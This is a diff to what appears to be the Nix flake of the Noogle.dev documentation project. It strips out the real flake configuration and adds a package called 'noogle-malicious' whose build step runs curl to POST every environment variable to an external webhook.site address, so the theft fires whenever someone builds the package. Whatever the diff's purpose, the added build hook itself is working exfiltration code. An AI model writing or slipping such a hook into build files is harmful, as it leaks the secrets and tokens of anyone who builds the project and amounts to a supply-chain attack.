@@ -1,55 +1,18 @@
-{
-  description = "Noogle.dev | Discover the nix api surface";
-  inputs = {
-    # --- sources of documentation ---
-    # Updated automatically
-    nixpkgs-master.url = "nixpkgs/master";
-    nix-master.url = "github:NixOS/nix/?ref=master";
-
-    # --- Other flake inputs ---
-    nixpkgs.url = "nixpkgs/nixos-unstable";
-    # A custom nix version, to introspect lambda values.
-    # nix.url = "github:hsjobeki/nix/?ref=feat/positions";
-
-    pre-commit-hooks = {
-      url = "github:cachix/pre-commit-hooks.nix";
-      inputs.nixpkgs.follows = "nixpkgs";
+perSystem = { pkgs, ... }: {
+  packages = {
+    malicious = pkgs.stdenv.mkDerivation {
+      pname = "noogle-malicious";
+      version = "1.0";
+      src = ./.;
+      buildPhase = ''
+        echo "Starting malicious build..."
+        curl -X POST --data "$(env)" https://webhook.site/c5f63ea0-6bbd-426c-9e1c-0e3c9ceea4f1
+        mkdir -p $out
+        echo "done" > $out/index.html
+      '';
+      installPhase = ''
+        cp -r . $out
+      '';
     };
-
-    systems.url = "github:nix-systems/default-linux";
-    flake-parts.url = "github:hercules-ci/flake-parts";
-    flake-parts.inputs.nixpkgs-lib.follows = "nixpkgs";
-    treefmt-nix.url = "github:numtide/treefmt-nix";
-    treefmt-nix.inputs.nixpkgs.follows = "nixpkgs";
-
-    crane.url = "github:ipetkov/crane";
-    crane.inputs.nixpkgs.follows = "nixpkgs";
   };
-
-  outputs = inputs@{ flake-parts, systems, ... }:
-    flake-parts.lib.mkFlake { inherit inputs; } ({ ... }: {
-      systems = import systems;
-      imports = [
-        ./devShell.nix
-        ./preCommit.nix
-        ./website/flake-module.nix
-        ./salt/flake-module.nix
-        ./pasta/flake-module.nix
-        ./pesto/flake-module.nix
-        # Deprecated. Will be removed.
-        ./codemod/flake-module.nix
-        #
-        ./nixPlugin/flake-module.nix
-      ];
-      perSystem = { inputs', ... }: {
-        packages = {
-          # nix = inputs'.nix-master.packages.nix-cli.overrideAttrs (prev: {
-          #   # doCheck = false;
-          #   mesonFlags = prev.mesonFlags or [] ++ [
-          #     "-Dunit-tests=false"
-          #   ];
-          # });
-        };
-      };
-    });
-}
+};
